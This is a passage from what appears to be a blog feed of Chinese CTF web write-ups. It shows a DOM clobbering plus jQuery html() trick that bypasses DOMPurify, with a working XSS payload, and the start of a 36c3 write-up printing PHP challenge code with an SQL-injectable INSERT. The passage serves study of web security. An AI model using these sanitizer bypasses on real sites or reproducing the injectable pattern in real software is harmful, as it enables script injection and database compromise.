class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">test(this,x)</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200202004222.png" alt></p><p>&#x539F;&#x7406;&#x90FD;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x8FD9;&#x91CC;<code>test</code>&#x51FD;&#x6570;&#x5728;<code>onerror</code>&#x4F5C;&#x7528;&#x57DF;&#x627E;&#x5230;&#x4E86; x &#x53D8;&#x91CF;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x4E0D;&#x4F1A;&#x518D;&#x53BB;&#x627E; window &#x4F5C;&#x7528;&#x57DF;&#x4E0B;&#x7684; <code>x=false</code>&#x53D8;&#x91CF;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x672C;&#x9898;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5F15;&#x5165;&#x4E00;&#x4E2A;<code>name=notify</code>&#x7684;&#x6807;&#x7B7E;&#x6765;&#x201C;&#x8986;&#x76D6;&#x201D;&#x6389;&#x539F;&#x6765;&#x7684; notify &#x53D8;&#x91CF;&#x3002;</p><p>&#x5176;&#x5B9E;&#x8FD9;&#x4E5F;&#x662F;&#x4E00;&#x5F00;&#x59CB;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x9898;&#x76EE;&#x7ED9;&#x51FA;&#x7684;&#x4EE3;&#x7801;&#x6709;&#x4E00;&#x5904;&#x4E5F;&#x6BD4;&#x8F83;&#x795E;&#x5947;&#x5C31;&#x662F; text &amp; img</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (text &amp;&amp; img) {</span><br><span class="line">    template = memeTemplate(img, text);</span><br><span class="line">    ...</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>memeGen</code>&#x51FD;&#x6570;&#x5728;&#x51FD;&#x6570;&#x5185;&#x627E;&#x4E0D;&#x5230;<code>text</code>&#xFF0C;onload &#x7684;&#x4F5C;&#x7528;&#x57DF;&#x4E5F;&#x627E;&#x4E0D;&#x5230;<code>text</code>&#xFF0C;&#x5C31;&#x4F1A;&#x53BB; script&#x4E0B;&#x9762;&#x627E;&#xFF0C;&#x800C;&#x591A;&#x4E2A; script &#x5C5E;&#x4E8E;&#x540C;&#x4E00;&#x4E2A;&#x4F5C;&#x7528;&#x57DF;&#xFF0C;&#x6240;&#x4EE5;&#x5BF9;&#x4E8E;&#x51FD;&#x6570;&#x5F53;&#x4E2D;&#x7684; text &#x4EE5;&#x53CA; img &#xFF0C;&#x5B83;&#x662F;&#x5728;&#x4E0B;&#x4E00;&#x5757; JS &#x4EE3;&#x7801;&#x6BB5;&#x5B9A;&#x4E49;&#x7684;&#x3002;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">let</span> notify = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">let</span> text = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&quot;text&quot;</span>);</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">let</span> img = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&quot;img&quot;</span>);</span></span><br><span class="line">  ...</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201222425.png" alt></p><h3 id="JQuery&#x2019;s-&#x2018;mXSS&#x2019;"><a href="#JQuery&#x2019;s-&#x2018;mXSS&#x2019;" class="headerlink" title="JQuery&#x2019;s &#x2018;mXSS&#x2019;"></a>JQuery&#x2019;s &#x2018;mXSS&#x2019;</h3><p>&#x6240;&#x4EE5;&#x57FA;&#x672C;&#x4E0A; notify &#x7684;&#x95EE;&#x9898;&#x6211;&#x4EEC;&#x89E3;&#x51B3;&#x4E86;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x5C31;&#x662F; DOM Purify &#x7684;&#x95EE;&#x9898;&#x4E86;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x6700;&#x7EC8;&#x6211;&#x4EEC;&#x8981;&#x63D2;&#x5165;&#x7684;&#x4EE3;&#x7801;&#x662F;&#x901A;&#x8FC7;<code>$(&quot;#notify&quot;).html(html)</code>&#x6765;&#x63D2;&#x5165;&#x7684;&#xFF0C;&#x800C;&#x53C2;&#x6570; html &#x53C8;&#x6765;&#x81EA;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html = <span class="hljs-string">`&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;&lt;b&gt;Meme&lt;/b&gt; created from <span class="hljs-subst">${DOMPurify.sanitize(text)}</span>&lt;/div&gt;`</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7B80;&#x5355;&#x8DDF;&#x4E00;&#x4E0B; JQuery &#x7684; <code>html()</code> &#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x6709;&#x4EE5;&#x4E0B;&#x5229;&#x7528;&#x94FE;&#xFF1A;</p><p><a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L372" target="_blank" rel="noopener">html()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L406" target="_blank" rel="noopener">append()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L312" target="_blank" rel="noopener">doManip()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L117" target="_blank" rel="noopener">buildFragment()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation/buildFragment.js#L39" target="_blank" rel="noopener">htmlPrefilter()</a></p><p>&#x5728; <a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L202" target="_blank" rel="noopener">htmlPrefilter()</a> &#x51FD;&#x6570;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x8FD9;&#x4E48;&#x4E00;&#x6BB5;&#x4EE3;&#x7801;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// source of htmlPrefilter()</span></span><br><span class="line">jQuery.extend( {</span><br><span class="line">truehtmlPrefilter: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"> html </span>) </span>{</span><br><span class="line">truetrue<span class="hljs-keyword">return</span> html.replace( rxhtmlTag, <span class="hljs-string">&quot;&lt;$1&gt;&lt;/$2&gt;&quot;</span> );</span><br><span class="line">true},</span><br><span class="line">    ...</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x5C31;&#x662F;&#x7528;&#x6765;&#x8F6C;&#x6362;&#x4E00;&#x4E9B;&#x81EA;&#x95ED;&#x5408;&#x6807;&#x7B7E;&#x7684;&#x6807;&#x7B7E;&#xFF0C;&#x4F8B;&#x5982;<code>&lt;blah/&gt;</code>&#x53D8;&#x6210;<code>&lt;blah&gt;&lt;/blah&gt;</code>&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x6765;&#x5B9E;&#x73B0;&#x4E00;&#x4E9B;&#x7ED5;&#x8FC7;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span>Elon</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7ECF;&#x8FC7;<code>innerHTML</code>&#x4F1A;&#x53D8;&#x6210;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span>Elon</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F46;&#x662F;&#x7ECF;&#x8FC7; jquery <code>html()</code> &#x5C31;&#x4F1A;&#x53D8;&#x6210;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="line">Elon</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x901A;&#x8FC7;<code>html()</code>&#x53EF;&#x4EE5;&#x628A;&#x4E00;&#x4E9B;&#x81EA;&#x95ED;&#x5408;&#x7684;&#x62C6;&#x5206;&#xFF0C;&#x4EE5;&#x53CA;&#x628A;&#x5185;&#x5BB9;&#x8F6C;&#x6362;&#x51FA;&#x53BB;&#xFF0C;&#x6709;&#x70B9;&#x7C7B;&#x4F3C;&#x4E8E; mXSS &#xFF0C;&#x6700;&#x7EC8;&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x7684;&#x662F;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>Elon<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x7ED5;&#x8FC7; XSS WAF&#xFF0C;&#x4F8B;&#x5982;&#x4EE5;&#x4E0B;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-actionscript">alert()<span class="hljs-comment">//</span></span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7ECF;&#x8FC7;<code>DOMPurify.sanitize</code>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-actionscript">alert(<span class="hljs-number">1337</span>)<span class="hljs-comment">//</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7ECF;&#x8FC7; jquery <code>html()</code>&#x5230;&#x6700;&#x7EC8;&#x6E32;&#x67D3;&#x9875;&#x9762;&#x5C31;&#x53D8;&#x6210;&#x4E86;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-handlebars"><span class="hljs-xml">alert(1337)//<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x8FD9;&#x5C31;&#x662F; JQuery&#x2019;s &#x7C7B;&#x4F3C;&#x4E8E; mXSS &#x7684; trick</p><p>&#x7EFC;&#x4E0A;&#x6240;&#x8FF0;&#xFF0C;&#x914D;&#x5408;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6700;&#x7EC8; payload &#x5982;&#x4E0B;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">name</span>=<span class="hljs-string">notify</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-actionscript">alert()<span class="hljs-comment">//</span></span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6700;&#x7EC8;&#x4F20;&#x53C2;:</p><p></p><figure class="highlight xquery hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img=valid_img_url&amp;<span class="hljs-type">text</span>=&lt;img<span class="hljs-built_in"> name</span><span class="hljs-meta">%3dnotify</span>&gt;<span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style%2F</span>&gt;</span></span></span><span class="hljs-xml"><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert()%2F%2F</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x6211;&#x4E5F;&#x4E0D;&#x662F;&#x975E;&#x5E38;&#x6E05;&#x695A;&#x4F5C;&#x8005;&#x4E3A;&#x5565;&#x8981;&#x52A0;&#x4E00;&#x4E2A; img &#x53C2;&#x6570;//&#x5168;&#x7A0B;&#x6CA1;&#x6709;&#x7528;&#x5230;</p><p>&#x6700;&#x540E;&#x518D;&#x6765;&#x4E00;&#x904D;&#xFF1A;</p><p><img src="https://i.redd.it/rz3o1yibnc511.png" alt></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/" target="_blank" rel="noopener">DOM Clobbering</a></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement" target="_blank" rel="noopener">HTMLAnchorElement</a></p></body></html>]]></content>
        <author>
            <name><![CDATA[Zedd‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/01/08/36c3-web/</id>
        <title><![CDATA[36c3 Web Â≠¶‰π†ËÆ∞ÂΩï]]></title>
        <updated>2020-05-05T17:31:59+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/01/08/36c3-web/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/01/08/36c3-web/"><![CDATA[<html><head></head><body><p>&#x7B7E;&#x5230;&#x9009;&#x624B;&#x4E0D;&#x8BF7;&#x81EA;&#x6765;&#xFF0C;&#x7ECF;&#x8FC7;&#x4E86;&#x597D;&#x51E0;&#x5929;&#x7684;&#x7422;&#x78E8;&#xFF0C;&#x7EC8;&#x4E8E;&#x628A;&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x7684;&#x9898;&#x76EE;&#x90FD;&#x5F04;&#x5F97;&#x5DEE;&#x4E0D;&#x591A;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x672C;&#x6B21;&#x6BD4;&#x8D5B; Web &#x9898;&#x76EE;&#x7684;&#x89E3;&#x6CD5;&#x3002;</p><blockquote class="colorquote success"><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E;&#x5148;&#x77E5;&#x793E;&#x533A;&#xFF1A;<a href="https://xz.aliyun.com/t/7081" target="_blank" rel="noopener">https://xz.aliyun.com/t/7081</a></p></blockquote><a id="more"></a><p>&#x5982;&#x679C;&#x5E08;&#x5085;&#x4EEC;&#x6709;&#x66F4;&#x597D;&#x66F4;&#x6709;&#x610F;&#x601D;&#x7684;&#x89E3;&#x6CD5;&#xFF0C;&#x6B22;&#x8FCE;&#x591A;&#x591A;&#x4E0E;&#x83DC;&#x9E21;&#x4EA4;&#x6D41;&#x3002;&#x975E;&#x5E38;&#x611F;&#x8C22; @rebirth @wonderkun @wupco &#x7B49;&#x5E08;&#x5085;&#x5728;&#x6211;&#x5B66;&#x4E60;&#x672C;&#x6B21;&#x6BD4;&#x8D5B;&#x8D5B;&#x9898;&#x65F6;&#x5019;&#x4E0D;&#x538C;&#x5176;&#x70E6;&#x5730;&#x6307;&#x5BFC;&#x6211;&#x3002;</p><h2 id="File-Magician"><a href="#File-Magician" class="headerlink" title="File Magician"></a>File Magician</h2><blockquote><p><strong>Difficulty estimate</strong>: easy</p><p><strong>Solved</strong>:133/321</p><p><strong>Points</strong>: round(1000 &#xB7; min(1, 10 / (9 + [133 solves]))) = <strong>70</strong> points</p><p><strong>Description:</strong></p><p>Finally (again), a minimalistic, open-source file hosting solution.</p><p><strong>Download:</strong></p><p><a href="https://github.com/ZeddYu/36c3-CTF-Web/blob/master/file%20magician/file%20magician-3ace41f3b0282a70.tar.xz" target="_blank" rel="noopener">file magician-3ace41f3b0282a70.tar.xz (2.1 KiB)</a></p></blockquote><p>&#x7B97;&#x662F; Web &#x5F53;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x7B7E;&#x5230;&#x9898;&#xFF0C;&#x76F4;&#x63A5;&#x7ED9;&#x51FA; Docker &#x6587;&#x4EF6;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x672C;&#x5730;&#x642D;&#x8D77;&#x6765;&#x8BD5;&#x8BD5;&#x3002;</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="hljs-number">0</span>);</span><br><span class="line">ini_set(<span class="hljs-string">&apos;display_errors&apos;</span>, <span class="hljs-number">0</span>);</span><br><span class="line">ini_set(<span class="hljs-string">&apos;display_startup_errors&apos;</span>, <span class="hljs-number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>( ! <span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&apos;id&apos;</span>])) {</span><br><span class="line">    $_SESSION[<span class="hljs-string">&apos;id&apos;</span>] = bin2hex(random_bytes(<span class="hljs-number">32</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$d = <span class="hljs-string">&apos;/var/www/html/files/&apos;</span>.$_SESSION[<span class="hljs-string">&apos;id&apos;</span>] . <span class="hljs-string">&apos;/&apos;</span>;</span><br><span class="line">@mkdir($d, <span class="hljs-number">0700</span>, <span class="hljs-keyword">TRUE</span>);</span><br><span class="line">chdir($d) || <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;chdir&apos;</span>);</span><br><span class="line"></span><br><span class="line">$db = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">&apos;sqlite:&apos;</span> . $d . <span class="hljs-string">&apos;db.sqlite3&apos;</span>);</span><br><span class="line">$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line">$db-&gt;exec(<span class="hljs-string">&apos;CREATE TABLE IF NOT EXISTS upload(id INTEGER PRIMARY KEY, info TEXT);&apos;</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_FILES[<span class="hljs-string">&apos;file&apos;</span>]) &amp;&amp; $_FILES[<span class="hljs-string">&apos;file&apos;</span>][<span class="hljs-string">&apos;size&apos;</span>] &lt; <span class="hljs-number">10</span>*<span class="hljs-number">1024</span> ){</span><br><span class="line">    $s = <span class="hljs-string">&quot;INSERT INTO upload(info) VALUES (&apos;&quot;</span> .(<span class="hljs-keyword">new</span> finfo)-&gt;file($_FILES[<span class="hljs-string">&apos;file&apos;</span>][<span class="hljs-string">&apos;tmp_name&apos;</span>]). <span class="hljs-string">&quot; &apos;);&quot;</span>;</span><br><span class="line">    $db-&gt;exec($s);</span><br><span class="line">    move_uploaded_file( $_FILES[<span class="hljs-string">&apos;file&apos;</span>][<span class="hljs-string">&apos;tmp_name&apos;</span>], $d . $db-&gt;lastInsertId()) || <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;move_upload_file&apos;</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$uploads = [];</span><br><span class="line">$sql = <span class="hljs-string">&apos;SELECT * FROM upload&apos;</span>;</span><br><span class="line"><span class="hljs-keyword">foreach</span> ($db-&gt;query($sql) <span class="hljs-keyword">as</span> $row) {</span><br><span class="line">    $uploads[] = [$row[<span class="hljs-string">&apos;id&apos;</span>], $row[<span class="hljs-string">&apos;info&apos;</span>]];</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;file magician&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;form enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;upload&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;table&gt;</span><br><span class="line">    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">foreach</span>($uploads <span class="hljs-keyword">as</span> $upload):<span class="hljs-meta">?&gt;</span></span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;&lt;a href=<span class="hljs-string">&quot;&lt;?= &apos;/files/&apos; . $_SESSION[&apos;id&apos;] . &apos;/&apos; . $upload[0] ?&gt;&quot;</span>&gt;<span class="hljs-meta">&lt;?</span>= $upload[<span class="hljs-number">0</span>] <span class="hljs-meta">?&gt;</span>&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="hljs-meta">&lt;?</span>= $upload[<span class="hljs-number">1</span>] <span class="hljs-meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endforeach</span><span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9898;&#x76EE;&#x529F;&#x80FD;&#x70B9;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x81EA;&#x5DF1;&#x7684; sandbox &#x5F53;&#x4E2D;&#x770B;&#x5230;&#x81EA;&#x5DF1;&#x7684;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#xFF0C;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x662F;&#x7531;<code>(new finfo)-&gt;file</code>&#x6765;&#x5224;&#x65AD;&#x7684;&#xFF0C;&#x8FD8;&#x4F7F;&#x7528;&#x4E86; sqlite &#x8FDB;&#x884C;&#x5B58;&#x50A8;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x7684;&#x8BB0;&#x5F55;&#x3002;</p><p>&#x7531;&#x4E8E;&#x521B;&#x5EFA;&#x7684;&#x6570;&#x636E;&#x5E93;&#x89C4;&#x5B9A;&#x4E86; id &#x4E3A;&#x81EA;&#x589E;&#x957F;&#x7684;&#x6574;&#x578B;&#x4E3B;&#x952E;&#xFF0C;&#x800C;&#x4E14;&#x5B83;&#x4F7F;&#x7528;&#x4E86;<code>lastInsertId()</code>&#x8FD4;&#x56DE;&#x6700;&#x540E;&#x4E00;&#x6B21; insert &#x6570;&#x636E;&#x7684; id &#x4F5C;&#x4E3A;&#x6587;&#x4EF6;&#x540D;</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file( $_FILES[<span class="hljs-string">&apos;file&apos;</span>][<span class="hljs-string">&apos;tmp_name&apos;</span>], $d . $db-&gt;lastInsertId()) || <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;move_upload_file&apos;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x57FA;&#x672C;&#x4E0A;&#x53EF;&#x4EE5;&#x4E0D;&#x7528;&#x8003;&#x8651;&#x662F;&#x5426;&#x5B58;&#x5728;&#x901A;&#x8FC7;&#x53EF;&#x63A7;&#x6587;&#x4EF6;&#x540D;&#x4E0A;&#x4F20;&#x6587;&#x4EF6; Getshell 